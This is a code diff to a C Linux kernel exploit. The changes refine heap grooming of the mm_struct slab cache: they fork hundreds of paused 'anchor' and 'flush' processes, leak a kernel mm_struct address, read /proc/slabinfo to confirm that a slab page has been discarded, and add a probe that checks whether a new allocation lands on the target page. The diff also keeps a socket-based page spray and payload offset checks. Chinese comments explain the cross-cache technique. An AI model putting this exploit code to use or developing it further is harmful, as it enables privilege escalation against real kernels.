@@ -171,12 +171,15 @@ static uint64_t read_mm(int fd, int timeout_s) {
 }
 
 static pid_t kids[2048]; static int nk;
-static pid_t keepers[256]; static int nkeep;
+static pid_t anchors[256]; static int nanchor;
+static pid_t flushk[512]; static int nflush;
 static void pause_child(void) { prctl(PR_SET_PDEATHSIG, SIGKILL); for (;;) pause(); }
 static pid_t fork_pause(void) { pid_t p = fork(); if (p == 0) pause_child(); if (p > 0) kids[nk++] = p; return p; }
 static void killp(pid_t p) { if (p > 0) { kill(p, SIGKILL); waitpid(p, NULL, 0); } }
-static pid_t fork_keeper(void) { pid_t p = fork(); if (p == 0) pause_child(); if (p > 0) keepers[nkeep++] = p; return p; }
-static void kill_keepers(void) { for (int i = 0; i < nkeep; i++) { if (keepers[i] > 0) killp(keepers[i]); keepers[i] = -1; } nkeep = 0; }
+static pid_t fork_anchor(void) { pid_t p = fork(); if (p == 0) pause_child(); if (p > 0) anchors[nanchor++] = p; return p; }
+static pid_t fork_flush(void) { pid_t p = fork(); if (p == 0) pause_child(); if (p > 0) flushk[nflush++] = p; return p; }
+static void kill_anchors(void) { for (int i = 0; i < nanchor; i++) { if (anchors[i] > 0) killp(anchors[i]); anchors[i] = -1; } nanchor = 0; }
+static void kill_flush(void) { for (int i = 0; i < nflush; i++) { if (flushk[i] > 0) killp(flushk[i]); flushk[i] = -1; } nflush = 0; }
 static int spray_hold(const unsigned char *page, size_t len) {
     int nsock = 256, maxpkt = 16;
     int (*fds)[2] = calloc(nsock, sizeof(int[2]));
@@ -196,6 +199,21 @@ static int spray_hold(const unsigned char *page, size_t len) {
     return ok;
 }
 
+static void mm_counts(unsigned *act, unsigned *num, unsigned *sd) {
+    FILE *f = fopen("/proc/slabinfo", "r");
+    *act = *num = *sd = 0;
+    if (!f) return;
+    char line[256]; unsigned a=0,n=0,sd0=0,sdn=0;
+    while (fgets(line, sizeof(line), f)) {
+        if (strncmp(line, "mm_struct", 9) == 0) {
+            sscanf(line, "%*s %u %u %*u %*u %*u : tunables %*u %*u %*u : slabdata %u %u %*u",
+                   &a, &n, &sd0, &sdn);
+            break;
+        }
+    }
+    fclose(f);
+    *act=a; *num=n; *sd=sd0;
+}
 static unsigned mm_slabdata(void) {
     FILE *f = fopen("/proc/slabinfo", "r");
     if (!f) return 0;
@@ -219,10 +237,13 @@ static int groom_once(uint64_t *out_mm, unsigned *before, unsigned *after) {
     for (int i = 0; i < 17; i++) fork_pause();
     int rfd; pid_t leak = spawn_ksnitch(&rfd);
     for (int i = 0; i < 18; i++) fork_pause();
-    /* 造 5 个 partial slab（每 slab 杀 1 个，留 17 个活着），保证 leak slab 空时 nr_partial>=5 */
-    nkeep = 0;
-    for (int i = 0; i < 90; i++) fork_keeper();
-    for (int i = 0; i < 5; i++) { int idx = i * 18; if (idx < nkeep) { killp(keepers[idx]); keepers[idx] = -1; } }
+    /* 5 个 anchor partial slab（每 slab 杀 1 个，留 17 个永远活着）→ flush 期间 nr_partial 恒 >=5 */
+    nanchor = 0;
+    for (int i = 0; i < 90; i++) fork_anchor();
+    for (int i = 0; i < 5; i++) { int idx = i * 18; if (idx < nanchor) { killp(anchors[idx]); anchors[idx] = -1; } }
+    /* 360 个 flush 代理：杀 leak 后全部释放，制造 CPU partial overflow 来 unfreeze/discard */
+    nflush = 0;
+    for (int i = 0; i < 360; i++) fork_flush();
     uint64_t mm = read_mm(rfd, 120);
     if (!mm || mm == (uint64_t)-1) {
         lg("leak failed");
@@ -235,7 +256,7 @@ static int groom_once(uint64_t *out_mm, unsigned *before, unsigned *after) {
     nk = 0;
     *before = mm_slabdata();
     killp(leak);                    /* L 空页先进 CPU partial */
-    kill_keepers();                 /* 再大量释放，overflow CPU partial → unfreeze，L 空页被 discard */
+    kill_flush();                   /* 大量释放，overflow CPU partial → unfreeze；anchor 保持 nr_partial>=5 */
     usleep(20 * 1000);
     *after = mm_slabdata();
     return 0;
@@ -304,11 +325,36 @@ int main(void) {
     for (int attempt = 0; attempt < 3; attempt++) {
         if (groom_once(&mm, &before, &after) == 0 && after < before) { ok = 1; break; }
         lg("groom attempt %d: no discard (before=%u after=%u)", attempt, before, after);
-        kill_keepers();
+        kill_anchors(); kill_flush();
     }
-    if (!ok) { lg("ABORT: no slab discard observed after 3 attempts"); kill_keepers(); return 1; }
+    if (!ok) { lg("ABORT: no slab discard observed after 3 attempts"); kill_anchors(); kill_flush(); return 1; }
     mm_page = mm & ~0x3FFFULL;
     lg("accepted L=%016llx (discard %u -> %u)", (unsigned long long)mm_page, before, after);
+
+    if (getenv("T3_PAGECHECK")) {
+        for (int t = 0; t < 3; t++) {
+            unsigned act=0, num=0, sd=0; mm_counts(&act, &num, &sd);
+            unsigned free_objs = (num > act) ? (num - act) : 0;
+            lg("PAGECHECK[%d] free_objs=%u (active=%u num=%u)", t, free_objs, act, num);
+            if (free_objs > 300) free_objs = 300;
+            for (unsigned i = 0; i < free_objs; i++) fork_pause();
+            int rfd; pid_t pr = spawn_ksnitch(&rfd);
+            uint64_t pmm = read_mm(rfd, 120);
+            if (pmm) {
+                uint64_t pp = pmm & ~0x3FFFULL;
+                lg("PAGECHECK[%d] probe mm=%016llx page=%016llx %s L", t,
+                   (unsigned long long)pmm, (unsigned long long)pp,
+                   pp == mm_page ? "==" : "!=");
+                killp(pr);
+                if (pp == mm_page) { lg("PAGEOK"); return 0; }
+            } else {
+                lg("PAGECHECK[%d] probe mm=NA", t);
+                killp(pr);
+            }
+        }
+        lg("PAGECHECK done (no probe landed in L)");
+        return 0;
+    }
 
     if (has_zero(Q)) { lg("ABORT: Q has zero byte"); return 1; }
     if (pick_offsets() != 0) { lg("ABORT: no zero-free offsets"); return 1; }
